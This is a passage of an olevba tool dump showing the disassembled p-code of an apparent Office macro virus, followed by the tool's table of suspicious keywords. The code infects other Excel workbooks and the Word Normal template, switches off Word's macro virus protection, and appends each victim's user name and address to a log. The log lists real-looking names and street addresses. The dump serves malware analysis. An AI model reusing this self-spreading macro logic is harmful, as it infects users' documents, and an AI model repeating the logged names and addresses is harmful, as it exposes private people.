' 	LitStr 0x01FA "XOVGG YFYLO XVVPHPCE XVVPHPCE2 RDFMJCLWLKEW QJDYRTTFQPABTXO QFWDYJTSW JSKYJ QOCQXBNSB WXBKXZLPIZXDIJ GNINRCIJTGZJAS ZVSZYI BURWUC LNOJAASHJY JJSCLQOYY XMQNYDYG XVVPHPCETmp TLIFV JCIOGLQ KRFJRBSHCJK YMDKDPYQSJM SJMTIBIDBOZY CKUWLVFNSN WJSEFKVJJAXOYH VODUOLTM HXLNFVNTH BKZVFFYA EGRDMONPL VODUOLTMTmp OFEBXELAYKTDUS IXRCGOQZVJPW JUDYXAATGQHODP SPRQV GWUNWRL PWAODAHUPV BBQYAYDHQDLAS JHVJWVLIWJL GVKBEKCBLBWPL TRDVPZE GTOYNYL SLXKDPOD HUWZTP RATDE UWPTVQZQBH RZYEJOJ LRGPOCBFUHXTHTT YQXDOHRTDNJ NQMHDECBCMRDRU"
' 	St XMQNYDYG 
' Line #104:
' 	ArgsCall Read 0x0000 
' Line #105:
' 	Ld JJSCLQOYY 
' 	St QFWDYJTSW 
' Line #106:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld XMQNYDYG 
' 	FnLen 
' 	For 
' Line #107:
' 	Ld XMQNYDYG 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld XMQNYDYG 
' 	FnLen 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #108:
' 	Ld QJDYRTTFQPABTXO 
' 	Ld XMQNYDYG 
' 	FnLen 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld XVVPHPCETmp 
' 	Ld XMQNYDYG 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St XVVPHPCETmp 
' 	EndIf 
' Line #109:
' 	StartForVariable 
' 	Ld JSKYJ 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld GNINRCIJTGZJAS 
' 	Ld ZVSZYI 
' 	Sub 
' 	Ld JJSCLQOYY 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld ZVSZYI 
' 	Add 
' 	FnInt 
' 	For 
' Line #110:
' 	Ld QFWDYJTSW 
' 	ArgsLd XVVPHPCE2 0x0001 
' 	Ld LNOJAASHJY 
' 	Ld BURWUC 
' 	Sub 
' 	Ld JJSCLQOYY 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld BURWUC 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld QFWDYJTSW 
' 	ArgsSt XVVPHPCE2 0x0001 
' Line #111:
' 	StartForVariable 
' 	Ld JSKYJ 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	Ld XVVPHPCETmp 
' 	Ld QFWDYJTSW 
' 	ArgsSt XVVPHPCE 0x0001 
' Line #113:
' 	LitStr 0x0000 ""
' 	St XVVPHPCETmp 
' Line #114:
' 	Ld QFWDYJTSW 
' 	Ld JJSCLQOYY 
' 	Add 
' 	St QFWDYJTSW 
' Line #115:
' 	ElseBlock 
' Line #116:
' 	Ld XVVPHPCETmp 
' 	Ld XMQNYDYG 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St XVVPHPCETmp 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' 	Ld GWUNWRL 
' 	St QOCQXBNSB 
' Line #120:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld XOVGG 
' 	FnLen 
' 	For 
' Line #121:
' 	StartForVariable 
' 	Ld QFWDYJTSW 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld YFYLO 
' 	For 
' Line #122:
' 	Ld XOVGG 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld QFWDYJTSW 
' 	ArgsLd XVVPHPCE 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld QFWDYJTSW 
' 	ArgsLd XVVPHPCE 0x0001 
' 	Eq 
' 	IfBlock 
' Line #123:
' 	Ld RDFMJCLWLKEW 
' 	Ld QFWDYJTSW 
' 	ArgsLd XVVPHPCE2 0x0001 
' 	Concat 
' 	St RDFMJCLWLKEW 
' Line #124:
' 	Ld QJDYRTTFQPABTXO 
' 	Ld QFWDYJTSW 
' 	ArgsLd XVVPHPCE 0x0001 
' 	FnLen 
' 	Add 
' 	Ld JJSCLQOYY 
' 	Sub 
' 	St QJDYRTTFQPABTXO 
' Line #125:
' 	Ld SPRQV 
' 	St QOCQXBNSB 
' Line #126:
' 	ExitFor 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Ld QFWDYJTSW 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	Ld QOCQXBNSB 
' 	Ld GWUNWRL 
' 	Eq 
' 	IfBlock 
' Line #130:
' 	Ld RDFMJCLWLKEW 
' 	Ld XOVGG 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St RDFMJCLWLKEW 
' Line #131:
' 	ElseBlock 
' Line #132:
' 	Ld GWUNWRL 
' 	St QOCQXBNSB 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	Ld RDFMJCLWLKEW 
' 	St XOVGG 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Private Sub WJSEFKVJJAXOYH(ByRef XOVGG As String))
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	Dim (Const) 
' 	LitStr 0x0002 "' "
' 	VarDefn EGRDMONPL
' 	LitDI2 0x0001 
' 	VarDefn JJSCLQOYY
' Line #140:
' 	Dim (Const) 
' 	LitStr 0x0011 "hh:mm:ss: AMPM - "
' 	VarDefn GVKBEKCBLBWPL
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	VarDefn TRDVPZE
' Line #141:
' 	Dim 
' 	VarDefn VODUOLTMTmp
' 	VarDefn VODUOLTM
' 	VarDefn OFEBXELAYKTDUS
' 	VarDefn IXRCGOQZVJPW
' 	VarDefn HXLNFVNTH
' 	VarDefn BKZVFFYA (As String)
' Line #142:
' 	Dim 
' 	VarDefn QJDYRTTFQPABTXO (As Integer)
' Line #143:
' 	LitDI2 0x000A 
' 	Ld JJSCLQOYY 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St HXLNFVNTH 
' Line #144:
' 	Ld Application 
' 	MemLd UserAddress 
' 	St VODUOLTM 
' Line #145:
' 	Ld Time 
' 	Ld GVKBEKCBLBWPL 
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	Ld TRDVPZE 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St IXRCGOQZVJPW 
' Line #146:
' 	Ld JJSCLQOYY 
' 	LitDI2 0x000A 
' 	Mul 
' 	ArgsLd Chr 0x0001 
' 	St BKZVFFYA 
' Line #147:
' 	Ld Application 
' 	MemLd UserName 
' 	St OFEBXELAYKTDUS 
' Line #148:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld VODUOLTM 
' 	FnLen 
' 	For 
' Line #149:
' 	Ld VODUOLTM 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	Ld HXLNFVNTH 
' 	Ne 
' 	IfBlock 
' Line #150:
' 	Ld VODUOLTM 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	Ld BKZVFFYA 
' 	Ne 
' 	IfBlock 
' Line #151:
' 	Ld VODUOLTMTmp 
' 	Ld VODUOLTM 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St VODUOLTMTmp 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	ElseBlock 
' Line #154:
' 	Ld VODUOLTMTmp 
' 	Ld HXLNFVNTH 
' 	Concat 
' 	Ld EGRDMONPL 
' 	Concat 
' 	St VODUOLTMTmp 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' 	Ld XOVGG 
' 	Ld HXLNFVNTH 
' 	Concat 
' 	Ld EGRDMONPL 
' 	Concat 
' 	Ld IXRCGOQZVJPW 
' 	Concat 
' 	Ld HXLNFVNTH 
' 	Concat 
' 	Ld EGRDMONPL 
' 	Concat 
' 	Ld OFEBXELAYKTDUS 
' 	Concat 
' 	Ld HXLNFVNTH 
' 	Concat 
' 	Ld EGRDMONPL 
' 	Concat 
' 	Ld VODUOLTM 
' 	Concat 
' 	Ld HXLNFVNTH 
' 	Concat 
' 	St XOVGG 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Private Sub RZYEJOJ(ByVal XOVGG As String))
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	Dim 
' 	VarDefn NQMHDECBCMRDRU (As Long)
' Line #162:
' 	Dim 
' 	VarDefn SLXKDPOD (As Object)
' Line #163:
' 	Dim 
' 	VarDefn LRGPOCBFUHXTHTT
' 	VarDefn YQXDOHRTDNJ (As String)
' Line #164:
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	St LRGPOCBFUHXTHTT 
' Line #165:
' 	LitHI2 0x0000 
' 	St NQMHDECBCMRDRU 
' Line #166:
' 	LitStr 0x0008 "Options6"
' 	St YQXDOHRTDNJ 
' Line #167:
' 	Ld NQMHDECBCMRDRU 
' 	LitStr 0x0000 ""
' 	Ld LRGPOCBFUHXTHTT 
' 	Ld YQXDOHRTDNJ 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #168:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set SLXKDPOD 
' Line #169:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn JJSCLQOYY
' 	LitDI2 0x0000 
' 	VarDefn PWAODAHUPV
' Line #170:
' 	Dim 
' 	VarDefn RATDE (As String)
' Line #171:
' 	Dim 
' 	VarDefn QJDYRTTFQPABTXO
' 	VarDefn QFWDYJTSW (As Integer)
' Line #172:
' 	LitStr 0x000C "ThisWorkbook"
' 	St RATDE 
' Line #173:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #174:
' 	StartForVariable 
' 	Ld QFWDYJTSW 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #175:
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld PWAODAHUPV 
' 	Eq 
' 	IfBlock 
' Line #176:
' 	Ld JJSCLQOYY 
' 	Ld XOVGG 
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #177:
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld RATDE 
' 	Eq 
' 	IfBlock 
' Line #178:
' 	LitDI2 0x0021 
' 	Ld JJSCLQOYY 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #179:
' 	ElseBlock 
' Line #180:
' 	Ld JJSCLQOYY 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld SLXKDPOD 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	StartForVariable 
' 	Ld QFWDYJTSW 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	NextVar 
' Line #185:
' 	SetStmt 
' 	LitNothing 
' 	Set SLXKDPOD 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Private Sub UWPTVQZQBH(ByVal XOVGG As String))
' Line #188:
' 	OnError (Resume Next) 
' Line #189:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn SPRQV
' 	LitVarSpecial (False)
' 	VarDefn GWUNWRL
' 	LitDI2 0x0001 
' 	VarDefn JJSCLQOYY
' 	LitDI2 0x0000 
' 	VarDefn PWAODAHUPV
' Line #190:
' 	Dim 
' 	VarDefn HUWZTP (As Object)
' Line #191:
' 	Dim 
' 	VarDefn JCIOGLQ (As Boolean)
' Line #192:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set HUWZTP 
' Line #193:
' 	Ld JJSCLQOYY 
' 	Ld HUWZTP 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld PWAODAHUPV 
' 	Eq 
' 	IfBlock 
' Line #194:
' 	Ld HUWZTP 
' 	MemLd NormalTemplate 
' 	MemLd Saved 
' 	St JCIOGLQ 
' Line #195:
' 	Ld GWUNWRL 
' 	Ld HUWZTP 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #196:
' 	Ld JJSCLQOYY 
' 	Ld XOVGG 
' 	Ld JJSCLQOYY 
' 	Ld HUWZTP 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #197:
' 	Ld JCIOGLQ 
' 	Ld SPRQV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HUWZTP 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	SetStmt 
' 	LitNothing 
' 	Set HUWZTP 
' Line #200:
' 	EndSub 
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x0023 " 09:50:58:  - Saturday, 13 Apr 1997"
' Line #203:
' 	QuoteRem 0x0000 0x000B " Fred Cohen"
' Line #204:
' 	QuoteRem 0x0000 0x000B " fc@all.net"
' Line #205:
' Line #206:
' 	QuoteRem 0x0000 0x0023 " 10:10:57: AM - Sunday, 21 Feb 1999"
' Line #207:
' 	QuoteRem 0x0000 0x000F " Jeff Goldstein"
' Line #208:
' 	QuoteRem 0x0000 0x0000 ""
' Line #209:
' Line #210:
' 	QuoteRem 0x0000 0x0022 " 01:16:33: PM - Monday, 1 Mar 1999"
' Line #211:
' 	QuoteRem 0x0000 0x0010 " Custis Colelman"
' Line #212:
' 	QuoteRem 0x0000 0x0000 ""
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x0022 " 04:34:58: PM - Monday, 8 Mar 1999"
' Line #215:
' 	QuoteRem 0x0000 0x000C " Marc Benson"
' Line #216:
' 	QuoteRem 0x0000 0x0000 ""
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0023 " 05:12:25: PM - Monday, 24 May 1999"
' Line #219:
' 	QuoteRem 0x0000 0x0012 " Caroline Hartsock"
' Line #220:
' 	QuoteRem 0x0000 0x0015 " Caroline M. Hartsock"
' Line #221:
' 	Reparse 0x001D "3863 Rodman Street, N.W., #54"
' Line #222:
' 	Reparse 0x0017 "Washington, D.C.  20016"
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x0025 " 10:57:30: AM - Wednesday, 2 Jun 1999"
' Line #225:
' 	QuoteRem 0x0000 0x000E " Mary A. Downs"
' Line #226:
' 	QuoteRem 0x0000 0x000D " Tucker Flyer"
' Line #227:
' 	Reparse 0x0013 "1615 L Street, N.W."
' Line #228:
' 	Reparse 0x001C "Washington, D.C.  20036-5612"
' Line #229:
' Line #230:
' 	QuoteRem 0x0000 0x0024 " 09:41:28: AM - Thursday, 3 Jun 1999"
' Line #231:
' 	QuoteRem 0x0000 0x0013 " Christy A. Tolbert"
' Line #232:
' 	QuoteRem 0x0000 0x0016 " Tucker, Flyer & Lewis"
' Line #233:
' 	Reparse 0x0013 "1615 L Street, N.W."
' Line #234:
' 	Reparse 0x001C "Washington, D.C.  20036-5610"
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x0023 " 02:21:55: PM - Tuesday, 8 Jun 1999"
' Line #237:
' 	QuoteRem 0x0000 0x0010 " Mary S. Calkins"
' Line #238:
' 	QuoteRem 0x0000 0x0021 " COVENANT UNITED METHODIST CHURCH"
' Line #239:
' 	Reparse 0x001A "20301 Pleasant Ridge Drive"
' Line #240:
' 	Reparse 0x001D "Montgomery Village, MD  20886"
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x0025 " 05:03:09: PM - Wednesday, 9 Jun 1999"
' Line #243:
' 	QuoteRem 0x0000 0x0010 " Carol B. Friend"
' Line #244:
' 	QuoteRem 0x0000 0x0000 ""
' Line #245:
' Line #246:
' 	QuoteRem 0x0000 0x0023 " 06:16:12: PM - Friday, 11 Jun 1999"
' Line #247:
' 	QuoteRem 0x0000 0x0013 " Preferred Customer"
' Line #248:
' 	QuoteRem 0x0000 0x0000 ""
' Line #249:
' Line #250:
' 	QuoteRem 0x0000 0x0026 " 07:27:45: PM - Wednesday, 23 Jun 1999"
' Line #251:
' 	QuoteRem 0x0000 0x0011 " Wayne G. Travell"
' Line #252:
' 	QuoteRem 0x0000 0x0016 " Tucker, Flyer & Lewis"
' Line #253:
' 	Reparse 0x0013 "1615 L Street, N.W."
' Line #254:
' 	Reparse 0x001C "Washington, D.C.  20036-5610"
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x0025 " 10:30:08: AM - Thursday, 24 Jun 1999"
' Line #257:
' 	QuoteRem 0x0000 0x0011 " Nicole E. Dysart"
' Line #258:
' 	QuoteRem 0x0000 0x0013 " Tucker Flyer, P.C."
' Line #259:
' 	Reparse 0x0013 "1615 L Street, N.W."
' Line #260:
' 	Reparse 0x001C "Washington, D.C.  20036-5610"
' Line #261:
' Line #262:
' 	QuoteRem 0x0000 0x0026 " 12:23:33: PM - Wednesday, 30 Jun 1999"
' Line #263:
' 	QuoteRem 0x0000 0x0011 " Jane L. Johansen"
' Line #264:
' 	QuoteRem 0x0000 0x000D " Tucker Flyer"
' Line #265:
' 	Reparse 0x0013 "1615 L Street, N.W."
' Line #266:
' 	Reparse 0x001C "Washington, D.C.  20036-5612"
' Line #267:
' Line #268:
' 	QuoteRem 0x0000 0x0023 " 06:43:55: PM - Tuesday, 6 Jul 1999"
' Line #269:
' 	QuoteRem 0x0000 0x000C " Kendal Tyre"
' Line #270:
' 	QuoteRem 0x0000 0x0000 ""
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0025 " 07:31:17: AM - Wednesday, 7 Jul 1999"
' Line #273:
' 	QuoteRem 0x0000 0x0004 " jlo"
' Line #274:
' 	QuoteRem 0x0000 0x0000 ""
' Line #275:
' Line #276:
' 	QuoteRem 0x0000 0x0024 " 11:13:56: AM - Thursday, 8 Jul 1999"
' Line #277:
' 	QuoteRem 0x0000 0x000E " Deborah Quinn"
' Line #278:
' 	QuoteRem 0x0000 0x0000 ""
' Line #279:
' Line #280:
' 	QuoteRem 0x0000 0x0022 " 01:54:29: PM - Friday, 9 Jul 1999"
' Line #281:
' 	QuoteRem 0x0000 0x0008 " Library"
' Line #282:
' 	QuoteRem 0x0000 0x0000 ""
' Line #283:
' Line #284:
' 	QuoteRem 0x0000 0x0023 " 05:54:56: PM - Monday, 12 Jul 1999"
' Line #285:
' 	QuoteRem 0x0000 0x0008 " Outlook"
' Line #286:
' 	QuoteRem 0x0000 0x0000 ""
' Line #287:
' Line #288:
' 	QuoteRem 0x0000 0x0023 " 10:48:41: AM - Friday, 16 Jul 1999"
' Line #289:
' 	QuoteRem 0x0000 0x0007 " PSINet"
' Line #290:
' 	QuoteRem 0x0000 0x0000 ""
' Line #291:
' Line #292:
' 	QuoteRem 0x0000 0x0022 " 03:18:33: PM - Monday, 2 Aug 1999"
' Line #293:
' 	QuoteRem 0x0000 0x0007 " PSINet"
' Line #294:
' 	QuoteRem 0x0000 0x0000 ""
' Line #295:
' Line #296:
' 	QuoteRem 0x0000 0x0026 " 10:43:05: 오후 - Tuesday, 31 Aug 1999"
' Line #297:
' 	QuoteRem 0x0000 0x0007 " 조병현"
' Line #298:
' 	QuoteRem 0x0000 0x0000 ""
' Line #299:
' Line #300:
' 	QuoteRem 0x0000 0x0027 " 08:35:53: 오후 - Wednesday, 3 Nov 1999"
' Line #301:
' 	QuoteRem 0x0000 0x0007 " 조병현"
' Line #302:
' 	QuoteRem 0x0000 0x0000 ""
' Line #303:
' Line #304:
' 	QuoteRem 0x0000 0x0027 " 07:48:42: 오후 - Wednesday, 1 Dec 1999"
' Line #305:
' 	QuoteRem 0x0000 0x0007 " 김경민"
' Line #306:
' 	QuoteRem 0x0000 0x0000 ""
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x0028 " 10:16:09: 오전 - Wednesday, 26 Jan 2000"
' Line #309:
' 	QuoteRem 0x0000 0x0007 " 조병현"
' Line #310:
' 	QuoteRem 0x0000 0x0000 ""
' Line #311:
' Line #312:
' 	QuoteRem 0x0000 0x0025 " 02:03:07: 오후 - Tuesday, 4 Jul 2000"
' Line #313:
' 	QuoteRem 0x0000 0x0007 " 허욱헌"
' Line #314:
' 	QuoteRem 0x0000 0x0000 ""
' Line #315:
' Line #316:
' 	QuoteRem 0x0000 0x0028 " 05:11:11: 오후 - Wednesday, 26 Jul 2000"
' Line #317:
' 	QuoteRem 0x0000 0x0008 " YJ Shin"
' Line #318:
' 	QuoteRem 0x0000 0x0000 ""
' Line #319:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

